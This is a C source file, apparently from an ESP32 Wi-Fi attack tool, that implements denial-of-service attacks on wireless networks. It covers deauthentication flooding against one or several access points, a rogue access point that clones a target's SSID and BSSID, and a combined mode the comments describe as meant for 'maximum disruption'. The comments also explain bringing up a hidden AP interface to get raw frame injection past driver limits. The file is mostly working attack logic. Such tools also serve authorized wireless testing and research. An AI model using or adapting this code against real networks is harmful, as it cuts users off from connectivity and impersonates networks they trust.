#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

/**
 * @brief Starts a Denial of Service (DoS) attack using the specified method.
 * @param attack_config Configuration including method and target AP(s).
 */
void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack with method %d...", attack_config->method);
    method = attack_config->method;
    
    // For broadcast-based deauth attacks, we need to ensure the AP interface is active
    // even if we are not broadcasting a visible SSID. This enables raw frame injection
    // which is often restricted on STA-only interfaces in certain driver versions.
    if (method == ATTACK_DOS_METHOD_BROADCAST) {
        ESP_LOGI(TAG, "Activating hidden AP interface for deauth injection");
        wifi_config_t ap_config = {
            .ap = {
                .ssid = "INTERNAL_DEAUTH",
                .ssid_len = 15,
                .authmode = WIFI_AUTH_OPEN,
                .max_connection = 1,
                .ssid_hidden = 1
            },
        };
        wifictl_ap_start(&ap_config);
        // Delay to ensure the radio has switched to the dual-mode or AP state before injection
        vTaskDelay(pdMS_TO_TICKS(100)); 
    }

    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            if (attack_config->ap_records != NULL && attack_config->ap_count > 0) {
                // Multi-target mode: rotates through multiple BSSIDs
                ESP_LOGI(TAG, "Starting multi-target broadcast deauth on %d APs", attack_config->ap_count);
                attack_method_broadcast_multi(attack_config->ap_records, attack_config->ap_count, 100); 
            } else {
                // Single target mode
                ESP_LOGI(TAG, "Starting single-target broadcast deauth");
                attack_method_broadcast(attack_config->ap_record, 250); 
            }
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            // Impersonates the target AP by cloning its SSID and BSSID
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            if (attack_config->ap_record != NULL) {
                attack_method_rogueap(attack_config->ap_record);
            } else {
                ESP_LOGE(TAG, "Invalid ap_record for Rogue AP attack");
            }
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            // Simultaneously clones the AP and floods deauth packets for maximum disruption
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_COMBINE_ALL");
            if (attack_config->ap_record != NULL) {
                attack_method_rogueap(attack_config->ap_record);
                attack_method_broadcast(attack_config->ap_record, 250); 
            } else {
                ESP_LOGE(TAG, "Invalid ap_record for combined attack");
            }
            break;
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
}

/**
 * @brief Stops the currently running DoS attack and cleans up resources.
 */
void attack_dos_stop() {
    ESP_LOGI(TAG, "Stopping DoS attack with method %d", method);
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            // Return to STA mode to hide the internal AP used for injection
            wifictl_ap_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            // Restore original MAC address and stop the fake AP
            wifictl_restore_ap_mac();
            wifictl_ap_stop();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            // Stop both deauth flooding and the rogue AP
            attack_method_broadcast_stop();
            wifictl_restore_ap_mac();
            wifictl_ap_stop();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method %d! Attack may not be stopped properly.", method);
    }
    method = -1;
    ESP_LOGI(TAG, "DoS attack stopped");
}